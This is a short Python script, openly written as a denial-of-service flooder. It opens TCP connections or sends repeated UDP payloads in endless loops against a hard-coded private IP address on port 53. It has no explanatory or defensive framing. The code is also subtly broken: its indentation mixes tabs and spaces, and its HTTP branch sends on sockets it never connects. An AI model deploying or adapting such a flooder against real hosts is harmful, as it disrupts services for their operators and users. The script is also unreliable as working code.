import socket

host = "192.168.126.128"
port = 53
buffer_size = 2048
transmission = "TCP"
attack_message = b"DENIAL OF SERVICE!" * 100

if transmission == "TCP":
	if not port == 80:
	    while True:
		    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		    conn.connect((host, port))

		    data = conn.recv(buffer_size)

		    conn.close()
    else:
    	while True:
    		conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    		conn.sendall(b"GET / HTTP/1.1\r\n\r\n")
    		conn.close()

elif transmission == "UDP":
	while True:
		conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		conn.connect((host, port))

		conn.sendto(attack_message, (host, port))
		conn.close()